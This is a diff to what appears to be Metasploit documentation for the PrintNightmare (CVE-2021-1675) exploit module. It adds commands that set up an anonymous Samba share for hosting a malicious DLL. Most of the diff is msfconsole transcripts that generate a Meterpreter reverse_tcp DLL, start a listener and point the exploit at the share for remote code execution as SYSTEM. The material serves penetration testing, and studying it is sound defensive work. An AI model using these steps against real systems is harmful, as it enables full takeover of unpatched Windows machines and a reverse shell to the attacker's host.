@@ -10,7 +10,43 @@ request, resulting in remote code execution as NT AUTHORITY\SYSTEM.
     1. Set the `LHOST` and `LPORT` values
     1. Do: `to_handler` to start the payload handler
     1. Do: `generate -f dll -o /path/to/save/the/payload.dll` to generate the DLL file
-1. Start an SMB server with anonymous read access containing the DLL payload
+1. Start an SMB server with anonymous read access containing the DLL payload.
+    1. `sudo apt-get install -y samba samba-common`
+    1. `sudo cp -pf /etc/samba/smb.conf /etc/samba/smb.conf.bak` to backup your existing config.
+    1. `sudo mkdir /var/public`
+    1. Add the following into the end of the `/etc/samba/smb.conf` file:
+       ```
+       [public]
+	    comment = Public Directories
+	    path = /var/public
+	    guest ok = Yes
+       ```
+    1. Restart Samba with `sudo service smbd restart`.
+1. Generate your DLL and place the file under `/var/public`.
+    ```
+    msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > use payload/windows/x64/meterpreter/reverse_tcp
+    msf6 payload(windows/x64/meterpreter/reverse_tcp) > show options
+
+    Module options (payload/windows/x64/meterpreter/reverse_tcp):
+
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+    LHOST                      yes       The listen address (an interface may be specified)
+    LPORT     4444             yes       The listen port
+
+    msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LHOST 192.168.224.128
+    LHOST => 192.168.224.128
+    msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LPORT 8822
+    LPORT => 8822
+    msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
+    [*] Payload Handler Started as Job 0
+
+    [*] Started reverse TCP handler on 192.168.224.128:8822
+    msf6 payload(windows/x64/meterpreter/reverse_tcp) > generate -f dll -o /home/gwillcox/payload.dll
+    [*] Writing 8704 bytes to /home/gwillcox/payload.dll...
+    msf6 payload(windows/x64/meterpreter/reverse_tcp) > sudo mv /home/gwillcox/payload.dll /var/public/payload.dll
+    ```
 1. Exploit the vulnerability to force the target to load the DLL payload
     1. From msfconsole
     1. Do: `use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare`
@@ -49,12 +85,12 @@ stager.
 
 ```
 msf6 > use payload/windows/x64/meterpreter/reverse_tcp
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LHOST 192.168.159.128 
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > set LHOST 192.168.159.128
 LHOST => 192.168.159.128
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler 
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
 [*] Payload Handler Started as Job 0
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > 
-[*] Started reverse TCP handler on 192.168.159.128:4444 
+msf6 payload(windows/x64/meterpreter/reverse_tcp) >
+[*] Started reverse TCP handler on 192.168.159.128:4444
 
 msf6 payload(windows/x64/meterpreter/reverse_tcp) > generate -f dll -o /tmp/reverse_tcp.x64.dll
 [*] Writing 8704 bytes to /tmp/reverse_tcp.x64.dll...
@@ -65,7 +101,7 @@ Next, use the module to trigger loading the DLL. Note that when setting the `DLL
 doubled so that they are escaped on the command line.
 
 ```
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare 
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
 msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > set DLL_PATH \\\\192.168.159.128\\public\\reverse_tcp.x64.dll
 DLL_PATH => \\192.168.159.128\public\reverse_tcp.x64.dll
 msf6 auxiliary(admin/dcerpc/cve_2021_1675_printnightmare) > set RHOSTS 192.168.159.96
